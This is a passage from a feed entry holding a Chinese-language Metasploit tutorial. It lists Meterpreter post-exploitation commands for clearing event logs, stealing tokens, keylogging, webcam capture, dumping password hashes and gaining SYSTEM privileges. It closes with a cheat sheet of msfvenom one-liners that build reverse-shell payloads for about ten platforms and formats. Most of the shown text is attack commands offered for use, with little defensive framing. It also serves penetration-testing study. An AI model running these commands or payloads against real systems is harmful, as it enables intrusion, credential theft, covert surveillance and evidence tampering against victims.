number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>  <span class="token number">2</span>     <span class="token comment" spellcheck="true">#在session2中删除到达192.168.12.0网段的路由</span>route <span class="token keyword">print</span>    <span class="token comment" spellcheck="true">#打印路由信息</span><span class="token comment" spellcheck="true">#也可以在进入session下添加路由</span>run autoroute <span class="token operator">-</span>s <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.0</span><span class="token operator">/</span><span class="token number">24</span>             <span class="token comment" spellcheck="true">#添加到达192.168.11.0网段的路由run autoroute -s 192.168.12.0/24             #添加到达192.168.12.0网段的路由run autoroute -s 0.0.0.0/0                   #添加到达0.0.0.0/0的路由</span>run autoroute <span class="token operator">-</span>p                             <span class="token comment" spellcheck="true">#打印路由信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="R1lUS"></a></p><h3 id="3-4：系统命令"><a href="#3-4：系统命令" class="headerlink" title="3.4：系统命令"></a>3.4：系统命令</h3><pre class="line-numbers language-sql"><code class="language-sql">clearev <span class="token operator">-</span>清除了受害者的计算机上的事件日志drop_token <span class="token operator">-</span>被盗的令牌<span class="token keyword">execute</span><span class="token operator">-</span>执行命令getpid <span class="token operator">-</span>获取当前进程 ID <span class="token punctuation">(</span>PID<span class="token punctuation">)</span>getprivs <span class="token operator">-</span>尽可能获取尽可能多的特权getuid <span class="token operator">-</span>获取作为运行服务器的用户<span class="token keyword">kill</span> <span class="token operator">-</span>终止指定 PID 的进程ps <span class="token operator">-</span>列出正在运行的进程reboot<span class="token operator">-</span>重新启动受害人的计算机reg <span class="token operator">-</span>与受害人的注册表进行交互rev2self <span class="token operator">-</span>在受害者机器上调用 RevertToSelf<span class="token punctuation">(</span><span class="token punctuation">)</span>shell <span class="token operator">-</span>在受害者计算机上打开一个shell<span class="token keyword">shutdown</span><span class="token operator">-</span>关闭了受害者的计算机steal_token <span class="token operator">-</span>试图窃取指定的 <span class="token punctuation">(</span>PID<span class="token punctuation">)</span> 进程的令牌sysinfo <span class="token operator">-</span>获取有关受害者计算机操作系统和名称等的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="zXEln"></a></p><h3 id="3-5：用户界面命令"><a href="#3-5：用户界面命令" class="headerlink" title="3.5：用户界面命令"></a>3.5：用户界面命令</h3><pre class="line-numbers language-sql"><code class="language-sql">keyscan_dump <span class="token operator">-</span>键盘记录软件的内容转储keyscan_start <span class="token operator">-</span>启动键盘记录软件keyscan_stop <span class="token operator">-</span>停止键盘记录软件screenshot<span class="token operator">-</span>抓去 meterpreter 桌面的屏幕截图set_desktop <span class="token operator">-</span>更改 meterpreter 桌面webcam_list – 列举摄像头webcam_snap – 抓取摄像头影像图片webcam_stream – 抓取摄像头影像流<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="Iexhf"></a></p><h3 id="3-6：其他常用命令"><a href="#3-6：其他常用命令" class="headerlink" title="3.6：其他常用命令"></a>3.6：其他常用命令</h3><pre class="line-numbers language-sql"><code class="language-sql">hashdump – 抓取<span class="token keyword">HASH</span>密码（SAM文件中的值）getsystem – 获得系统管理员权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a name="svFcG"></a></p><h1 id="四：MSFVenom"><a href="#四：MSFVenom" class="headerlink" title="四：MSFVenom"></a>四：MSFVenom</h1><blockquote><p>msfvenom取代了之前版本的msfpayload和msfencode，常用于生成木马并在目标机器上执行，使其在本地机器kali的MSF中上线….</p></blockquote><p><strong>》》》常用参数《《《</strong></p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">-</span>l<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--list &lt;type> 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,......all</span><span class="token operator">-</span>p<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--payload &lt; payload> 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</span><span class="token operator">-</span><span class="token number">f</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--format &lt; format> 指定输出格式</span><span class="token operator">-</span><span class="token number">e</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--encoder &lt;encoder> 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</span><span class="token operator">-</span><span class="token number">a</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--arch &lt; architecture> 指定payload的目标架构，例如x86 还是 x64 还是 x86_64</span><span class="token operator">-</span>o<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--out &lt; path> 指定创建好的payload的存放位置</span><span class="token operator">-</span><span class="token number">b</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--bad-chars &lt; list> 设定规避字符集，指定需要过滤的坏字符。例如：不使用 '\x0f'、'\x00'</span><span class="token operator">-</span>n<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--nopsled &lt; length> 为payload预先指定一个NOP滑动长度</span><span class="token operator">-</span>s<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--space &lt; length> 设定有效攻击荷载的最大长度，就是文件大小</span><span class="token operator">-</span>i<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--iterations &lt; count> 指定payload的编码次数</span><span class="token operator">-</span><span class="token number">c</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--add-code &lt; path> 指定一个附加的win32 shellcode文件</span><span class="token operator">-</span>x<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--template &lt; path> 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</span><span class="token operator">-</span>k<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><span class="token operator">-</span>v<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--var-name &lt; value> 指定一个自定义的变量，以确定输出格式</span><span class="token operator">-</span>t<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--timeout &lt;second> 从stdin读取有效负载时等待的秒数（默认为30，0表示禁用）</span><span class="token operator">-</span>h<span class="token punctuation">,</span><span class="token comment" spellcheck="true">--help 查看帮助选项</span><span class="token comment" spellcheck="true">--platform &lt; platform> 指定payload的目标平台</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>Linux:msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elfWindows:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exeMac:msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoPHP:msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.phpASP:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSP:msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspWAR:msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.warPython:msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pyBash:msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.shPerl:msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></pre><p><a href="https://www.fujieace.com/metasploit/introduction.html" target="_blank" rel="noopener">https://www.fujieace.com/metasploit/introduction.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a name=&quot;uav8E&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;一：初识Metasploit&quot;&gt;&lt;a href=&quot;#一：初识Metasploit&quot; class=&quot;headerlink&quot; title=&quot;一：初识Metas
      
    
    </summary>
    
    
  </entry>
  
</feed>
